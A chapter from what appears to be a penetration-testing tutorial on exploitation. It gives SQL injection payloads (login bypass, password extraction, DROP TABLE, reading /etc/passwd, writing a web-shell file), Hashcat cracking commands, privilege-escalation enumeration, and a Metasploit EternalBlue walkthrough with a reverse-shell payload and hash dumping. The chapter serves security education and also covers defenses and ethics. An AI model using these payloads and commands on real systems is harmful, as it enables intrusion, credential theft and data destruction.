CHAPTER 04

Exploitation Techniques

Understanding attack vectors, exploitation methods, and privilege escalation strategies

⚠️ CRITICAL DISCLAIMER

The techniques described in this chapter are for EDUCATIONAL and DEFENSIVE purposes only. Unauthorized exploitation of systems is illegal and unethical. Always obtain explicit written authorization before conducting any security testing.

This content is designed to help security professionals understand attack methodologies to better defend systems.

🎯 Understanding Exploitation

Exploitation is the process of taking advantage of a vulnerability to achieve unauthorized access or execute arbitrary code. This phase validates whether identified vulnerabilities can be weaponized and demonstrates their real-world impact.

Exploitation Objectives

  • Validate vulnerability existence and exploitability
  • Demonstrate real-world impact to stakeholders
  • Gain initial access to target systems
  • Escalate privileges to higher access levels
  • Establish persistence for continued access
  • Document attack paths and techniques

The Exploitation Process

EXPLOITATION WORKFLOW:

1. Vulnerability Identification
   └── From reconnaissance and scanning phases

2. Exploit Research
   ├── Search exploit databases (ExploitDB, CVE)
   ├── Analyze proof-of-concept code
   └── Study vulnerability details

3. Exploit Customization
   ├── Adapt exploit to target environment
   ├── Configure payload and options
   └── Test in safe/isolated environment

4. Exploit Execution
   ├── Launch exploit against target
   ├── Monitor for success indicators
   └── Establish session/shell

5. Post-Exploitation
   ├── Verify access level
   ├── Document evidence
   └── Maintain access (if authorized)

🌐 Web Application Exploitation

SQL Injection

SQL Injection allows attackers to interfere with database queries, potentially accessing or modifying data:

Detection Techniques

# Basic error-based detection
Original: /product?id=1
Test: /product?id=1'
Response: SQL syntax error → Vulnerable!

# Boolean-based detection
True: /product?id=1 AND 1=1  → Normal page
False: /product?id=1 AND 1=2 → Different/error page

# Time-based detection
/product?id=1 AND SLEEP(5)
Response delayed by ~5 seconds → Vulnerable!

Exploitation Examples (Educational)

# Authentication bypass
Username: admin' OR '1'='1
Password: anything

# Union-based data extraction
/product?id=1 UNION SELECT username,password FROM users--

# Stacked queries (if supported)
/product?id=1; DROP TABLE users--

# Reading files (MySQL)
/product?id=1 UNION SELECT LOAD_FILE('/etc/passwd')--

# Writing files (if permissions allow)
/product?id=1 UNION SELECT ''
  INTO OUTFILE '/var/www/shell.php'--

Defense Mechanisms

  • Use parameterized queries/prepared statements
  • Implement input validation and sanitization
  • Apply principle of least privilege for database accounts
  • Use ORM frameworks properly
  • Enable database query logging and monitoring

🔓 Authentication and Session Attacks

Brute Force Attacks

Attack Type Method Tool
Credential Stuffing Use leaked credential databases Custom scripts, credential lists
Password Spraying Try common passwords across many accounts Hydra, Burp Intruder
Dictionary Attack Try passwords from wordlist Hydra, Medusa, Patator
Hash Cracking Crack password hashes offline Hashcat, John the Ripper

Session Hijacking

# Session token theft vectors:

1. XSS-based cookie theft
   2. Network sniffing (unencrypted HTTP)
   Capture session cookies from network traffic

3. Session fixation
   Force victim to use attacker-controlled session ID

4. Predictable session tokens
   Analyze and predict session ID generation pattern

# Example attack flow:
Attacker → Steal valid session cookie → Replay in requests
  → Impersonate legitimate user

Password Attack Techniques

# Hash cracking example (educational)
# Using Hashcat for MD5 hash

hashcat -m 0 -a 0 hashes.txt rockyou.txt
# -m 0: MD5 mode
# -a 0: Dictionary attack
# hashes.txt: File containing password hashes
# rockyou.txt: Common password wordlist

# Mask attack (pattern-based)
hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?l?d?d?d?d
# Pattern: Uppercase + 4 lowercase + 4 digits
# Example: Admin2025

# Combination attack
hashcat -m 0 -a 1 wordlist1.txt wordlist2.txt
# Combines words from two lists

⬆️ Privilege Escalation

Privilege escalation is the act of exploiting a bug, design flaw, or configuration oversight to gain elevated access:

Linux Privilege Escalation

Vector Description Example
SUID Binaries Exploiting setuid programs find / -perm -4000 2>/dev/null
Sudo Misconfiguration Abusing sudo permissions sudo -l to list allowed commands
Kernel Exploits OS kernel vulnerabilities DirtyCow, PwnKit
Cron Jobs Writable scheduled tasks Check /etc/crontab, /var/spool/cron
Path Hijacking Manipulate PATH variable Create malicious binary in PATH

Enumeration Commands

# System information
uname -a                    # Kernel version
cat /etc/os-release        # OS version
cat /etc/passwd            # User accounts
cat /etc/group             # Groups

# User privileges
id                         # Current user/groups
sudo -l                    # Sudo permissions
cat /etc/sudoers           # Sudo configuration

# SUID/SGID files
find / -perm -4000 -type f 2>/dev/null    # SUID
find / -perm -2000 -type f 2>/dev/null    # SGID

# Writable files/directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type f 2>/dev/null

# Running processes
ps aux                     # All processes
ps aux | grep root        # Root processes

# Network connections
netstat -tulpn            # Listening services
ss -tulpn                 # Modern alternative

# Scheduled tasks
crontab -l                # User crontabs
cat /etc/crontab          # System crontab
ls -la /etc/cron.*        # Cron directories

Windows Privilege Escalation

Vector Description Tool/Command
Unquoted Service Paths Exploit spaces in service paths wmic service get name,pathname
Weak Service Permissions Modify service configurations accesschk.exe, sc qc
AlwaysInstallElevated MSI packages run as SYSTEM Registry check
Stored Credentials Find saved passwords cmdkey /list, LaZagne
Token Impersonation Steal process tokens Incognito, Potato exploits

# System information

🌐 Network Exploitation

Man-in-the-Middle Attacks

MITM attacks intercept communications between two parties:

Attack Vectors

  • ARP Spoofing: Poison ARP cache to redirect traffic
  • DNS Spoofing: Return malicious IP for DNS queries
  • SSL Stripping: Downgrade HTTPS to HTTP
  • Rogue Access Point: Create fake WiFi to intercept traffic
  • Session Hijacking: Steal and replay session tokens

🛠️ Exploitation Frameworks

Metasploit Framework

The most popular penetration testing framework:

# Basic Metasploit workflow
msfconsole

# Search for exploits
msf6 > search eternalblue
msf6 > search type:exploit platform:windows

# Use an exploit module
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show options
msf6 exploit(ms17_010_eternalblue) > show options

# Set required options
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50

# Select payload
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run the exploit
msf6 exploit(ms17_010_eternalblue) > exploit

# Meterpreter session commands
meterpreter > sysinfo           # System information
meterpreter > getuid            # Current user
meterpreter > hashdump          # Dump password hashes
meterpreter > screenshot        # Capture screenshot
meterpreter > shell             # Drop to system shell

Exploit Development Process

EXPLOIT DEVELOPMENT STAGES:

1. Vulnerability Analysis
   ├── Understand the vulnerability
   ├── Identify affected code/component
   └── Determine exploitation conditions

2. Proof of Concept
   ├── Create minimal working exploit
   ├── Verify vulnerability trigger
   └── Document behavior

3. Exploit Refinement
   ├── Improve reliability
   ├── Add payload delivery
   ├── Handle error conditions
   └── Test different environments

4. Weaponization
   ├── Add obfuscation if needed
   ├── Create delivery mechanism
   ├── Ensure payload execution
   └── Maintain stealth (if required)

5. Testing and Validation
   ├── Test in isolated environment
   ├── Verify across target versions
   ├── Document limitations
   └── Create detection signatures

🎓 Responsible Exploitation

⚠️ Ethical Guidelines

  • Authorization is Mandatory: Never exploit systems without written permission
  • Scope Compliance: Stay within defined scope and rules of engagement
  • Minimize Damage: Avoid destructive actions unless explicitly authorized
  • Data Protection: Handle any accessed data responsibly and confidentially
  • Disclosure: Report findings promptly and follow responsible disclosure practices
  • Documentation: Maintain detailed records of all activities
  • Cleanup: Remove artifacts, backdoors, and test data after engagement

Impact Assessment

When successfully exploiting a vulnerability, document:

  • Level of access achieved (user, admin, system)
  • Data accessible or potentially compromised
  • Systems affected or potentially affected
  • Ease of exploitation (skill level required)
  • Detectability of the attack
  • Potential for lateral movement
  • Business impact if exploited by attackers
